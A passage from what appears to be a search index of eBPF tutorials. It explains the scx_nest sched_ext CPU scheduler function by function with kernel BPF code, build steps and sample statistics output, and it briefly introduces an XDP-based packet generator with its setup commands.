statistic.</p>"},{"location":"tutorials/45-scx-nest/#update_attached","title":"<code>update_attached</code>","text":"<p>Updates the task's attached core based on recent execution:</p> <pre><code>static void update_attached(struct task_ctx *tctx, s32 prev_cpu, s32 new_cpu)\n{\n    if (tctx-&gt;prev_cpu == new_cpu)\n        tctx-&gt;attached_core = new_cpu;\n    tctx-&gt;prev_cpu = prev_cpu;\n}\n</code></pre> <p>This function updates the <code>attached_core</code> for a task. If the task has executed on the same core consecutively, it attaches the task to that core. It then updates the <code>prev_cpu</code> to reflect the latest core the task ran on.</p>"},{"location":"tutorials/45-scx-nest/#compact_primary_core","title":"<code>compact_primary_core</code>","text":"<p>Handles the compaction of a primary core by demoting it to the reserve nest:</p> <pre><code>static int compact_primary_core(void *map, int *key, struct bpf_timer *timer)\n{\n    struct bpf_cpumask *primary, *reserve;\n    s32 cpu = bpf_get_smp_processor_id();\n    struct pcpu_ctx *pcpu_ctx;\n\n    stat_inc(NEST_STAT(CALLBACK_COMPACTED));\n\n    /*\n     * If we made it to this callback, it means that the timer callback was\n     * never cancelled, and so the core needs to be demoted from the\n     * primary nest.\n     */\n    pcpu_ctx = bpf_map_lookup_elem(&amp;pcpu_ctxs, &amp;cpu);\n    if (!pcpu_ctx) {\n        scx_bpf_error(\"Couldn't lookup pcpu ctx\");\n        return 0;\n    }\n    bpf_rcu_read_lock();\n    primary = primary_cpumask;\n    reserve = reserve_cpumask;\n    if (!primary || !reserve) {\n        scx_bpf_error(\"Couldn't find primary or reserve\");\n        bpf_rcu_read_unlock();\n        return 0;\n    }\n\n    bpf_cpumask_clear_cpu(cpu, primary);\n    try_make_core_reserved(cpu, reserve, false);\n    bpf_rcu_read_unlock();\n    pcpu_ctx-&gt;scheduled_compaction = false;\n    return 0;\n}\n</code></pre> <p>When the compaction timer expires, <code>compact_primary_core</code> is invoked. It demotes the current CPU core from the primary nest to the reserve nest by clearing it from the primary mask and attempting to add it to the reserve mask using <code>try_make_core_reserved</code>. This ensures that inactive cores are efficiently managed, maintaining a balance between performance and resource utilization.</p>"},{"location":"tutorials/45-scx-nest/#nest_select_cpu","title":"<code>nest_select_cpu</code>","text":"<p>Determines the appropriate CPU for a task upon waking up:</p> <pre><code>s32 BPF_STRUCT_OPS(nest_select_cpu, struct task_struct *p, s32 prev_cpu, u64 wake_flags)\n{\n    struct bpf_cpumask *p_mask, *primary, *reserve;\n    s32 cpu;\n    struct task_ctx *tctx;\n    struct pcpu_ctx *pcpu_ctx;\n    bool direct_to_primary = false, reset_impatient = true;\n\n    tctx = bpf_task_storage_get(&amp;task_ctx_stor, p, 0, 0);\n    if (!tctx)\n        return -ENOENT;\n\n    bpf_rcu_read_lock();\n    p_mask = tctx-&gt;tmp_mask;\n    primary = primary_cpumask;\n    reserve = reserve_cpumask;\n    if (!p_mask || !primary || !reserve) {\n        bpf_rcu_read_unlock();\n        return -ENOENT;\n    }\n\n    tctx-&gt;prev_cpu = prev_cpu;\n\n    bpf_cpumask_and(p_mask, p-&gt;cpus_ptr, cast_mask(primary));\n\n    /* First try to wake the task on its attached core. */\n    if (bpf_cpumask_test_cpu(tctx-&gt;attached_core, cast_mask(p_mask)) &amp;&amp;\n        scx_bpf_test_and_clear_cpu_idle(tctx-&gt;attached_core)) {\n        cpu = tctx-&gt;attached_core;\n        stat_inc(NEST_STAT(WAKEUP_ATTACHED));\n        goto migrate_primary;\n    }\n\n    /*\n     * Try to stay on the previous core if it's in the primary set, and\n     * there's no hypertwin. If the previous core is the core the task is\n     * attached to, don't bother as we already just tried that above.\n     */\n    if (prev_cpu != tctx-&gt;attached_core &amp;&amp;\n        bpf_cpumask_test_cpu(prev_cpu, cast_mask(p_mask)) &amp;&amp;\n        scx_bpf_test_and_clear_cpu_idle(prev_cpu)) {\n        cpu = prev_cpu;\n        stat_inc(NEST_STAT(WAKEUP_PREV_PRIMARY));\n        goto migrate_primary;\n    }\n\n    if (find_fully_idle) {\n        /* Then try any fully idle core in primary. */\n        cpu = scx_bpf_pick_idle_cpu(cast_mask(p_mask),\n                                    SCX_PICK_IDLE_CORE);\n        if (cpu &gt;= 0) {\n            stat_inc(NEST_STAT(WAKEUP_FULLY_IDLE_PRIMARY));\n            goto migrate_primary;\n        }\n    }\n\n    /* Then try _any_ idle core in primary, even if its hypertwin is active. */\n    cpu = scx_bpf_pick_idle_cpu(cast_mask(p_mask), 0);\n    if (cpu &gt;= 0) {\n        stat_inc(NEST_STAT(WAKEUP_ANY_IDLE_PRIMARY));\n        goto migrate_primary;\n    }\n\n    if (r_impatient &gt; 0 &amp;&amp; ++tctx-&gt;prev_misses &gt;= r_impatient) {\n        direct_to_primary = true;\n        tctx-&gt;prev_misses = 0;\n        stat_inc(NEST_STAT(TASK_IMPATIENT));\n    }\n\n    reset_impatient = false;\n\n    /* Then try any fully idle core in reserve. */\n    bpf_cpumask_and(p_mask, p-&gt;cpus_ptr, cast_mask(reserve));\n    if (find_fully_idle) {\n        cpu = scx_bpf_pick_idle_cpu(cast_mask(p_mask),\n                                    SCX_PICK_IDLE_CORE);\n        if (cpu &gt;= 0) {\n            stat_inc(NEST_STAT(WAKEUP_FULLY_IDLE_RESERVE));\n            goto promote_to_primary;\n        }\n    }\n\n    /* Then try _any_ idle core in reserve, even if its hypertwin is active. */\n    cpu = scx_bpf_pick_idle_cpu(cast_mask(p_mask), 0);\n    if (cpu &gt;= 0) {\n        stat_inc(NEST_STAT(WAKEUP_ANY_IDLE_RESERVE));\n        goto promote_to_primary;\n    }\n\n    /* Then try _any_ idle core in the task's cpumask. */\n    cpu = scx_bpf_pick_idle_cpu(p-&gt;cpus_ptr, 0);\n    if (cpu &gt;= 0) {\n        /*\n         * We found a core that (we didn't _think_) is in any nest.\n         * This means that we need to either promote the core to the\n         * reserve nest, or if we're going direct to primary due to\n         * r_impatient being exceeded, promote directly to primary.\n         *\n         * We have to do one final check here to see if the core is in\n         * the primary or reserved cpumask because we could potentially\n         * race with the core changing states between AND'ing the\n         * primary and reserve masks with p-&gt;cpus_ptr above, and\n         * atomically reserving it from the idle mask with\n         * scx_bpf_pick_idle_cpu(). This is also technically true of\n         * the checks above, but in all of those cases we just put the\n         * core directly into the primary mask so it's not really that\n         * big of a problem. Here, we want to make sure that we don't\n         * accidentally put a core into the reserve nest that was e.g.\n         * already in the primary nest. This is unlikely, but we check\n         * for it on what should be a relatively cold path regardless.\n         */\n        stat_inc(NEST_STAT(WAKEUP_IDLE_OTHER));\n        if (bpf_cpumask_test_cpu(cpu, cast_mask(primary)))\n            goto migrate_primary;\n        else if (bpf_cpumask_test_cpu(cpu, cast_mask(reserve)))\n            goto promote_to_primary;\n        else if (direct_to_primary)\n            goto promote_to_primary;\n        else\n            try_make_core_reserved(cpu, reserve, true);\n        bpf_rcu_read_unlock();\n        return cpu;\n    }\n\n    bpf_rcu_read_unlock();\n    return prev_cpu;\n\npromote_to_primary:\n    stat_inc(NEST_STAT(PROMOTED_TO_PRIMARY));\nmigrate_primary:\n    if (reset_impatient)\n        tctx-&gt;prev_misses = 0;\n    pcpu_ctx = bpf_map_lookup_elem(&amp;pcpu_ctxs, &amp;cpu);\n    if (pcpu_ctx) {\n        if (pcpu_ctx-&gt;scheduled_compaction) {\n            if (bpf_timer_cancel(&amp;pcpu_ctx-&gt;timer) &lt; 0)\n                scx_bpf_error(\"Failed to cancel pcpu timer\");\n            if (bpf_timer_set_callback(&amp;pcpu_ctx-&gt;timer, compact_primary_core))\n                scx_bpf_error(\"Failed to re-arm pcpu timer\");\n            pcpu_ctx-&gt;scheduled_compaction = false;\n            stat_inc(NEST_STAT(CANCELLED_COMPACTION));\n        }\n    } else {\n        scx_bpf_error(\"Failed to lookup pcpu ctx\");\n    }\n    bpf_cpumask_set_cpu(cpu, primary);\n    /*\n     * Check to see whether the CPU is in the reserved nest. This can\n     * happen if the core is compacted concurrently with us trying to place\n     * the currently-waking task onto it. Similarly, this is the expected\n     * state of the core if we found the core in the reserve nest and are\n     * promoting it.\n     *\n     * We don't have to worry about racing with any other waking task here\n     * because we've atomically reserved the core with (some variant of)\n     * scx_bpf_pick_idle_cpu().\n     */\n    if (bpf_cpumask_test_cpu(cpu, cast_mask(reserve))) {\n        __sync_sub_and_fetch(&amp;nr_reserved, 1);\n        bpf_cpumask_clear_cpu(cpu, reserve);\n    }\n    bpf_rcu_read_unlock();\n    update_attached(tctx, prev_cpu, cpu);\n    scx_bpf_dispatch(p, SCX_DSQ_LOCAL, slice_ns, 0);\n    return cpu;\n}\n</code></pre> <p>The <code>nest_select_cpu</code> function is the heart of the <code>scx_nest</code> scheduler. When a task wakes up, this function determines the most suitable CPU core for its execution. The function follows a series of checks to ensure that tasks are placed on high-frequency, idle cores, promoting efficiency and performance.</p> <p>Initially, it retrieves the task's context from the <code>task_ctx_stor</code> map. It then locks the read-copy-update (RCU) lock to safely access the primary and reserve CPU masks. The scheduler first attempts to place the task on its attached core, ensuring core affinity. If the attached core is not idle, it tries the previous core. Depending on various conditions, including the task's impatience (<code>r_impatient</code>) and the availability of idle cores in the primary and reserve nests, the scheduler decides whether to migrate the task, promote a core to the primary nest, or demote a core to the reserve nest.</p> <p>Throughout the process, the scheduler updates relevant statistics to provide insights into its operations. The use of RCU locks ensures that the scheduler's decisions are made safely without interfering with other concurrent operations.</p>"},{"location":"tutorials/45-scx-nest/#nest_enqueue","title":"<code>nest_enqueue</code>","text":"<p>Handles the enqueuing of tasks into the scheduling queue:</p> <pre><code>void BPF_STRUCT_OPS(nest_enqueue, struct task_struct *p, u64 enq_flags)\n{\n    struct task_ctx *tctx;\n    u64 vtime = p-&gt;scx.dsq_vtime;\n\n    tctx = bpf_task_storage_get(&amp;task_ctx_stor, p, 0, 0);\n    if (!tctx) {\n        scx_bpf_error(\"Unable to find task ctx\");\n        return;\n    }\n\n    /*\n     * Limit the amount of budget that an idling task can accumulate\n     * to one slice.\n     */\n    if (vtime_before(vtime, vtime_now - slice_ns))\n        vtime = vtime_now - slice_ns;\n\n    scx_bpf_dispatch_vtime(p, FALLBACK_DSQ_ID, slice_ns, vtime, enq_flags);\n}\n</code></pre> <p>The <code>nest_enqueue</code> function manages the queuing of tasks, adjusting their virtual time (<code>vtime</code>) to ensure fairness and prevent tasks from accumulating excessive execution budget while idling. If a task's <code>vtime</code> falls below a certain threshold, it's adjusted to maintain balance within the scheduler.</p>"},{"location":"tutorials/45-scx-nest/#nest_dispatch","title":"<code>nest_dispatch</code>","text":"<p>Manages the dispatching of tasks to CPU cores:</p> <pre><code>void BPF_STRUCT_OPS(nest_dispatch, s32 cpu, struct task_struct *prev)\n{\n    struct pcpu_ctx *pcpu_ctx;\n    struct bpf_cpumask *primary, *reserve;\n    s32 key = cpu;\n    bool in_primary;\n\n    primary = primary_cpumask;\n    reserve = reserve_cpumask;\n    if (!primary || !reserve) {\n        scx_bpf_error(\"No primary or reserve cpumask\");\n        return;\n    }\n\n    pcpu_ctx = bpf_map_lookup_elem(&amp;pcpu_ctxs, &amp;key);\n    if (!pcpu_ctx) {\n        scx_bpf_error(\"Failed to lookup pcpu ctx\");\n        return;\n    }\n\n    if (!scx_bpf_consume(FALLBACK_DSQ_ID)) {\n        in_primary = bpf_cpumask_test_cpu(cpu, cast_mask(primary));\n\n        if (prev &amp;&amp; (prev-&gt;scx.flags &amp; SCX_TASK_QUEUED) &amp;&amp; in_primary) {\n            scx_bpf_dispatch(prev, SCX_DSQ_LOCAL, slice_ns, 0);\n            return;\n        }\n\n        stat_inc(NEST_STAT(NOT_CONSUMED));\n        if (in_primary) {\n            /*\n             * Immediately demote a primary core if the previous\n             * task on it is dying\n             *\n             * Note that we elect to not compact the \"first\" CPU in\n             * the mask so as to encourage at least one core to\n             * remain in the nest. It would be better to check for\n             * whether there is only one core remaining in the\n             * nest, but BPF doesn't yet have a kfunc for querying\n             * cpumask weight.\n             */\n            if ((prev &amp;&amp; prev-&gt;__state == TASK_DEAD) &amp;&amp;\n                (cpu != bpf_cpumask_first(cast_mask(primary)))) {\n                stat_inc(NEST_STAT(EAGERLY_COMPACTED));\n                bpf_cpumask_clear_cpu(cpu, primary);\n                try_make_core_reserved(cpu, reserve, false);\n            } else  {\n                pcpu_ctx-&gt;scheduled_compaction = true;\n                /*\n                 * The core isn't being used anymore. Set a\n                 * timer to remove the core from the nest in\n                 * p_remove if it's still unused by that point.\n                 */\n                bpf_timer_start(&amp;pcpu_ctx-&gt;timer, p_remove_ns,\n                               BPF_F_TIMER_CPU_PIN);\n                stat_inc(NEST_STAT(SCHEDULED_COMPACTION));\n            }\n        }\n        return;\n    }\n    stat_inc(NEST_STAT(CONSUMED));\n}\n</code></pre> <p>The <code>nest_dispatch</code> function is responsible for dispatching tasks to CPU cores. It first checks if there's a task available in the fallback dispatch queue (<code>FALLBACK_DSQ_ID</code>). If no task is consumed, it evaluates whether the previous task on the CPU is dead. If so, and the CPU is not the first in the primary mask, the scheduler demotes the core to the reserve nest. Otherwise, it schedules a compaction timer to potentially demote the core after a specified duration (<code>p_remove_ns</code>). If a task is successfully consumed from the fallback queue, it increments the corresponding statistic.</p>"},{"location":"tutorials/45-scx-nest/#nest_running","title":"<code>nest_running</code>","text":"<p>Updates the global virtual time when a task starts running:</p> <pre><code>void BPF_STRUCT_OPS(nest_running, struct task_struct *p)\n{\n    /*\n     * Global vtime always progresses forward as tasks start executing. The\n     * test and update can be performed concurrently from multiple CPUs and\n     * thus racy. Any error should be contained and temporary. Let's just\n     * live with it.\n     */\n    if (vtime_before(vtime_now, p-&gt;scx.dsq_vtime))\n        vtime_now = p-&gt;scx.dsq_vtime;\n}\n</code></pre> <p>The <code>nest_running</code> function ensures that the global virtual time (<code>vtime_now</code>) progresses forward as tasks start executing. This mechanism helps maintain fairness and temporal consistency across the scheduler's operations.</p>"},{"location":"tutorials/45-scx-nest/#nest_stopping","title":"<code>nest_stopping</code>","text":"<p>Handles the stopping of a task, adjusting its virtual time:</p> <pre><code>void BPF_STRUCT_OPS(nest_stopping, struct task_struct *p, bool runnable)\n{\n    /* scale the execution time by the inverse of the weight and charge */\n    p-&gt;scx.dsq_vtime += (slice_ns - p-&gt;scx.slice) * 100 / p-&gt;scx.weight;\n}\n</code></pre> <p>When a task stops running, <code>nest_stopping</code> adjusts its virtual time based on its execution slice and weight. This adjustment ensures that tasks are fairly accounted for in the scheduler's virtual time calculations, maintaining balance and preventing any single task from monopolizing CPU resources.</p>"},{"location":"tutorials/45-scx-nest/#nest_init_task","title":"<code>nest_init_task</code>","text":"<p>Initializes a new task's context:</p> <pre><code>s32 BPF_STRUCT_OPS(nest_init_task, struct task_struct *p,\n                   struct scx_init_task_args *args)\n{\n    struct task_ctx *tctx;\n    struct bpf_cpumask *cpumask;\n\n    /*\n     * @p is new. Let's ensure that its task_ctx is available. We can sleep\n     * in this function and the following will automatically use GFP_KERNEL.\n     */\n    tctx = bpf_task_storage_get(&amp;task_ctx_stor, p, 0,\n                                BPF_LOCAL_STORAGE_GET_F_CREATE);\n    if (!tctx)\n        return -ENOMEM;\n\n    cpumask = bpf_cpumask_create();\n    if (!cpumask)\n        return -ENOMEM;\n\n    cpumask = bpf_kptr_xchg(&amp;tctx-&gt;tmp_mask, cpumask);\n    if (cpumask)\n        bpf_cpumask_release(cpumask);\n\n    tctx-&gt;attached_core = -1;\n    tctx-&gt;prev_cpu = -1;\n\n    return 0;\n}\n</code></pre> <p>The <code>nest_init_task</code> function initializes the scheduling context for a new task. It ensures that the task's context is available by retrieving it from the <code>task_ctx_stor</code> map, creating a new <code>bpf_cpumask</code> for temporary calculations, and setting initial values for <code>attached_core</code> and <code>prev_cpu</code>.</p>"},{"location":"tutorials/45-scx-nest/#nest_enable","title":"<code>nest_enable</code>","text":"<p>Enables scheduling for a task by setting its virtual time:</p> <pre><code>void BPF_STRUCT_OPS(nest_enable, struct task_struct *p)\n{\n    p-&gt;scx.dsq_vtime = vtime_now;\n}\n</code></pre> <p>The <code>nest_enable</code> function activates scheduling for a task by initializing its virtual time (<code>dsq_vtime</code>) to the current global virtual time (<code>vtime_now</code>). This ensures that the task's scheduling state is synchronized with the scheduler's virtual time.</p>"},{"location":"tutorials/45-scx-nest/#stats_timerfn","title":"<code>stats_timerfn</code>","text":"<p>Handles periodic statistics collection:</p> <pre><code>static int stats_timerfn(void *map, int *key, struct bpf_timer *timer)\n{\n    s32 cpu;\n    struct bpf_cpumask *primary, *reserve;\n    const struct cpumask *idle;\n    stats_primary_mask = 0;\n    stats_reserved_mask = 0;\n    stats_other_mask = 0;\n    stats_idle_mask = 0;\n    long err;\n\n    bpf_rcu_read_lock();\n    primary = primary_cpumask;\n    reserve = reserve_cpumask;\n    if (!primary || !reserve) {\n        bpf_rcu_read_unlock();\n        scx_bpf_error(\"Failed to lookup primary or reserve\");\n        return 0;\n    }\n\n    idle = scx_bpf_get_idle_cpumask();\n    bpf_for(cpu, 0, nr_cpus) {\n        if (bpf_cpumask_test_cpu(cpu, cast_mask(primary)))\n            stats_primary_mask |= (1ULL &lt;&lt; cpu);\n        else if (bpf_cpumask_test_cpu(cpu, cast_mask(reserve)))\n            stats_reserved_mask |= (1ULL &lt;&lt; cpu);\n        else\n            stats_other_mask |= (1ULL &lt;&lt; cpu);\n\n        if (bpf_cpumask_test_cpu(cpu, idle))\n            stats_idle_mask |= (1ULL &lt;&lt; cpu);\n    }\n    bpf_rcu_read_unlock();\n    scx_bpf_put_idle_cpumask(idle);\n\n    err = bpf_timer_start(timer, sampling_cadence_ns - 5000, 0);\n    if (err)\n        scx_bpf_error(\"Failed to arm stats timer\");\n\n    return 0;\n}\n</code></pre> <p>The <code>stats_timerfn</code> function is invoked periodically by a central timer to collect and update scheduler statistics. It captures the current state of CPU cores, categorizing them into primary, reserve, other, and idle masks. This information provides insights into how the scheduler is managing CPU resources and task placement over time. After collecting the statistics, the function re-arms the timer to ensure continuous monitoring.</p>"},{"location":"tutorials/45-scx-nest/#nest_init","title":"<code>nest_init</code>","text":"<p>Initializes the <code>scx_nest</code> scheduler:</p> <pre><code>s32 BPF_STRUCT_OPS_SLEEPABLE(nest_init)\n{\n    struct bpf_cpumask *cpumask;\n    s32 cpu;\n    int err;\n    struct bpf_timer *timer;\n    u32 key = 0;\n\n    err = scx_bpf_create_dsq(FALLBACK_DSQ_ID, NUMA_NO_NODE);\n    if (err) {\n        scx_bpf_error(\"Failed to create fallback DSQ\");\n        return err;\n    }\n\n    cpumask = bpf_cpumask_create();\n    if (!cpumask)\n        return -ENOMEM;\n    bpf_cpumask_clear(cpumask);\n    cpumask = bpf_kptr_xchg(&amp;primary_cpumask, cpumask);\n    if (cpumask)\n        bpf_cpumask_release(cpumask);\n\n    cpumask = bpf_cpumask_create();\n    if (!cpumask)\n        return -ENOMEM;\n\n    bpf_cpumask_clear(cpumask);\n    cpumask = bpf_kptr_xchg(&amp;reserve_cpumask, cpumask);\n    if (cpumask)\n        bpf_cpumask_release(cpumask);\n\n    bpf_for(cpu, 0, nr_cpus) {\n        s32 key = cpu;\n        struct pcpu_ctx *ctx = bpf_map_lookup_elem(&amp;pcpu_ctxs, &amp;key);\n\n        if (!ctx) {\n            scx_bpf_error(\"Failed to lookup pcpu_ctx\");\n            return -ENOENT;\n        }\n        ctx-&gt;scheduled_compaction = false;\n        if (bpf_timer_init(&amp;ctx-&gt;timer, &amp;pcpu_ctxs, CLOCK_BOOTTIME)) {\n            scx_bpf_error(\"Failed to initialize pcpu timer\");\n            return -EINVAL;\n        }\n        err = bpf_timer_set_callback(&amp;ctx-&gt;timer, compact_primary_core);\n        if (err) {\n            scx_bpf_error(\"Failed to set pcpu timer callback\");\n            return -EINVAL;\n        }\n    }\n\n    timer = bpf_map_lookup_elem(&amp;stats_timer, &amp;key);\n    if (!timer) {\n        scx_bpf_error(\"Failed to lookup central timer\");\n        return -ESRCH;\n    }\n    bpf_timer_init(timer, &amp;stats_timer, CLOCK_BOOTTIME);\n    bpf_timer_set_callback(timer, stats_timerfn);\n    err = bpf_timer_start(timer, sampling_cadence_ns - 5000, 0);\n    if (err)\n        scx_bpf_error(\"Failed to arm stats timer\");\n\n    return err;\n}\n</code></pre> <p>The <code>nest_init</code> function sets up the <code>scx_nest</code> scheduler during system initialization. It creates a fallback dispatch queue (<code>FALLBACK_DSQ_ID</code>) and initializes the primary and reserve CPU masks. For each CPU, it retrieves the per-CPU context from the <code>pcpu_ctxs</code> map, initializes a timer for core compaction, and sets the callback to <code>compact_primary_core</code>. Additionally, it initializes and starts the central statistics timer (<code>stats_timer</code>) with the callback function <code>stats_timerfn</code>, ensuring that scheduler statistics are continuously monitored.</p>"},{"location":"tutorials/45-scx-nest/#nest_exit","title":"<code>nest_exit</code>","text":"<p>Handles cleanup when the scheduler exits:</p> <pre><code>void BPF_STRUCT_OPS(nest_exit, struct scx_exit_info *ei)\n{\n    UEI_RECORD(uei, ei);\n}\n</code></pre> <p>The <code>nest_exit</code> function records exit information and performs any necessary cleanup when the scheduler is being removed or the system is shutting down. This ensures that all resources are properly released and that the system remains stable.</p>"},{"location":"tutorials/45-scx-nest/#scx_ops_define","title":"<code>SCX_OPS_DEFINE</code>","text":"<p>Defines the operations structure for the <code>scx_nest</code> scheduler:</p> <pre><code>SCX_OPS_DEFINE(nest_ops,\n               .select_cpu        = (void *)nest_select_cpu,\n               .enqueue            = (void *)nest_enqueue,\n               .dispatch        = (void *)nest_dispatch,\n               .running            = (void *)nest_running,\n               .stopping        = (void *)nest_stopping,\n               .init_task        = (void *)nest_init_task,\n               .enable            = (void *)nest_enable,\n               .init            = (void *)nest_init,\n               .exit            = (void *)nest_exit,\n               .flags            = 0,\n               .name            = \"nest\");\n</code></pre> <p>The <code>SCX_OPS_DEFINE</code> macro binds all the scheduler's functions to the <code>nest_ops</code> structure, which the <code>sched_ext</code> framework uses to interface with the scheduler. This structure ensures that the scheduler's operations are correctly mapped and invoked by the kernel during task scheduling events.</p>"},{"location":"tutorials/45-scx-nest/#initialization-and-cleanup","title":"Initialization and Cleanup","text":"<p>Proper initialization and cleanup are crucial for the scheduler's stability and performance.</p>"},{"location":"tutorials/45-scx-nest/#nest_init-function","title":"<code>nest_init</code> Function","text":"<p>The <code>nest_init</code> function is responsible for setting up the scheduler during system initialization. Here's how it operates:</p> <ol> <li>Create Fallback Dispatch Queue:</li> <li> <p>It calls <code>scx_bpf_create_dsq</code> to create a fallback dispatch queue (<code>FALLBACK_DSQ_ID</code>). If this fails, it logs an error and exits.</p> </li> <li> <p>Initialize Primary and Reserve CPU Masks:</p> </li> <li>It creates and clears a new <code>bpf_cpumask</code> for the primary mask.</li> <li>It exchanges the newly created mask with the existing <code>primary_cpumask</code>. If an old mask exists, it releases it.</li> <li> <p>The same process is repeated for the reserve mask.</p> </li> <li> <p>Initialize Per-CPU Contexts:</p> </li> <li>For each CPU, it retrieves the per-CPU context from the <code>pcpu_ctxs</code> map.</li> <li>It initializes the <code>scheduled_compaction</code> flag to <code>false</code>.</li> <li>It initializes the timer using <code>bpf_timer_init</code> and sets the callback to <code>compact_primary_core</code> using <code>bpf_timer_set_callback</code>.</li> <li> <p>If any of these steps fail, it logs an error and exits.</p> </li> <li> <p>Initialize and Start Statistics Timer:</p> </li> <li>It retrieves the central statistics timer from the <code>stats_timer</code> map.</li> <li>It initializes the timer and sets its callback to <code>stats_timerfn</code>.</li> <li>It starts the timer with a delay of <code>sampling_cadence_ns - 5000</code> nanoseconds.</li> <li> <p>If starting the timer fails, it logs an error.</p> </li> <li> <p>Return:</p> </li> <li>The function returns the result of the timer initialization, indicating success or failure.</li> </ol> <p>This initialization process ensures that all necessary components of the scheduler are correctly set up, including CPU masks, timers, and dispatch queues.</p>"},{"location":"tutorials/45-scx-nest/#nest_exit-function","title":"<code>nest_exit</code> Function","text":"<p>The <code>nest_exit</code> function handles cleanup when the scheduler is being removed or the system is shutting down:</p> <pre><code>void BPF_STRUCT_OPS(nest_exit, struct scx_exit_info *ei)\n{\n    UEI_RECORD(uei, ei);\n}\n</code></pre> <p>This function records exit information through the <code>UEI_RECORD</code> macro, ensuring that any necessary cleanup actions are performed. Proper cleanup is essential to maintain system stability and prevent resource leaks.</p>"},{"location":"tutorials/45-scx-nest/#final-scheduler-definition","title":"Final Scheduler Definition","text":"<p>The <code>SCX_OPS_DEFINE</code> macro binds all the scheduler's functions into a single structure used by the <code>sched_ext</code> framework:</p> <pre><code>SCX_OPS_DEFINE(nest_ops,\n               .select_cpu        = (void *)nest_select_cpu,\n               .enqueue            = (void *)nest_enqueue,\n               .dispatch        = (void *)nest_dispatch,\n               .running            = (void *)nest_running,\n               .stopping        = (void *)nest_stopping,\n               .init_task        = (void *)nest_init_task,\n               .enable            = (void *)nest_enable,\n               .init            = (void *)nest_init,\n               .exit            = (void *)nest_exit,\n               .flags            = 0,\n               .name            = \"nest\");\n</code></pre> <p>This structure, <code>nest_ops</code>, effectively registers the scheduler's operations with the <code>sched_ext</code> framework, ensuring that the scheduler responds appropriately to various scheduling events and system states.</p>"},{"location":"tutorials/45-scx-nest/#compilation-and-execution","title":"Compilation and Execution","text":"<p>To compile and run the <code>scx_nest</code> scheduler, follow these steps:</p> <p>Compile the Code:</p> <p>Use <code>make</code> to build the scheduler. Ensure that you have the necessary build tools and kernel headers installed.</p> <pre><code>make\n</code></pre> <p>Run the Scheduler:</p> <p>Execute the compiled scheduler binary. Depending on your system's configuration and permissions, you might need to run this command with elevated privileges.</p> <pre><code>./scx_nest\n</code></pre>"},{"location":"tutorials/45-scx-nest/#sample-output","title":"Sample Output","text":"<p>Upon running the scheduler, you should observe output similar to the following:</p> <pre><code># ./scx_nest \n\nWakeup stats\n------------\nWAKEUP_ATTACHED=150\nWAKEUP_PREV_PRIMARY=61\nWAKEUP_FULLY_IDLE_PRIMARY=0\nWAKEUP_ANY_IDLE_PRIMARY=103\nWAKEUP_FULLY_IDLE_RESERVE=0\nWAKEUP_ANY_IDLE_RESERVE=216\nWAKEUP_IDLE_OTHER=11\n\n\nNest stats\n----------\nTASK_IMPATIENT=67\nPROMOTED_TO_PRIMARY=217\nPROMOTED_TO_RESERVED=8\nDEMOTED_TO_RESERVED=212\nRESERVED_AT_CAPACITY=6\nSCHEDULED_COMPACTION=525\nCANCELLED_COMPACTION=314\nEAGERLY_COMPACTED=8\nCALLBACK_COMPACTED=208\n\n\nConsume stats\n-------------\nCONSUMED=166\nNOT_CONSUMED=667\n\n\n\nMasks\n-----\nPRIMARY  ( 0): | -------------------------------------------------------------------------------------------------------------------------------- |\nRESERVED (10): | ***-*--*--------------------------------------------------------***-*--*-------------------------------------------------------- |\nOTHER    (128): | ******************************************************************************************************************************** |\nIDLE     (16): | ********--------------------------------------------------------********-------------------------------------------------------- |\n\n\n^CEXIT: unregistered from user space\n</code></pre> <p>This output provides comprehensive statistics on task wakeups, nest operations, consumption rates, and CPU mask statuses. It indicates how the scheduler is managing tasks and CPU cores, showcasing the effectiveness of the <code>scx_nest</code> algorithm in maintaining high-frequency core utilization and efficient task placement.</p>"},{"location":"tutorials/45-scx-nest/#summary-and-call-to-action","title":"Summary and Call to Action","text":"<p>In this tutorial, we've delved into the implementation of the <code>scx_nest</code> scheduler, an advanced eBPF program that customizes CPU scheduling to optimize performance based on core frequency and utilization. By leveraging the <code>sched_ext</code> framework, <code>scx_nest</code> demonstrates how eBPF can dynamically define scheduling behavior, offering flexibility and control beyond traditional schedulers.</p> <p>Key takeaways include:</p> <ul> <li>Understanding the flexibility and power of the <code>sched_ext</code> scheduler class.</li> <li>Exploring the intricate data structures and maps that underpin the <code>scx_nest</code> scheduler.</li> <li>Analyzing core functions that manage task placement, core compaction, and statistics collection.</li> <li>Learning how to compile and execute the scheduler, observing its impact through detailed statistics.</li> </ul> <p>The <code>scx_nest</code> scheduler serves as an excellent example of how advanced eBPF programming can be utilized to implement complex system functionalities in a flexible and dynamic manner.</p> <p>If you'd like to dive deeper into eBPF and explore more advanced examples, visit our tutorial repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or check out our website at https://eunomia.dev/tutorials/.</p>"},{"location":"tutorials/45-scx-nest/#references","title":"References","text":"<p>The original source code for the <code>scx_nest</code> scheduler is available in the sched-ext/scx repository.</p> <p>Additional resources that can enhance your understanding include:</p> <ul> <li>Linux Kernel Documentation: Scheduler Ext Documentation</li> <li>Kernel Source Tree: Linux Kernel <code>sched_ext</code> Tools</li> <li>eBPF Official Documentation: https://ebpf.io/docs/</li> <li>libbpf Documentation: https://github.com/libbpf/libbpf</li> </ul> <p>Feel free to explore these resources to expand your knowledge and continue your journey into advanced eBPF programming!</p> <p>Share on  Share on </p>"},{"location":"tutorials/46-xdp-test/","title":"xdp-pktgen: xdp based packet generator","text":"<p>This is a simple xdp based packet generator.</p>"},{"location":"tutorials/46-xdp-test/#how-to-use","title":"How to use","text":"<p>clone the repo, you can update the git submodule with following commands:</p> <pre><code>git submodule update --init --recursive\n</code></pre>"},{"location":"tutorials/46-xdp-test/#3-install-dependencies","title":"3. Install dependencies","text":"<p>For dependencies, it varies from distribution to distribution. You can refer to shell.nix and dockerfile for installation.</p> <p>On Ubuntu, you may run <code>make install</code> or</p> <pre><code>sudo apt-get install -y --no-install-recommends \\\n        libelf1 libelf-dev zlib1g-dev \\\n        make clang llvm\n</code></pre> <p>to install dependencies.</p>"},{"location":"tutorials/46-xdp-test/#4-build-the-project","title":"4. Build the project","text":"<p>To build the project, run the following command:</p> <pre><code>make build\n</code></pre> <p>This will compile your code and create the necessary binaries. You can you the <code>Github Code space</code> or <code>Github Action</code> to build the project as well.</p>"},{"location":"tutorials/46-xdp-test/#run-the-project","title":"Run the Project","text":"<p>You can run the binary with:</p> <pre><code>sudo ./xdp-pktgen\n</code></pre> <p>Share on  Share on 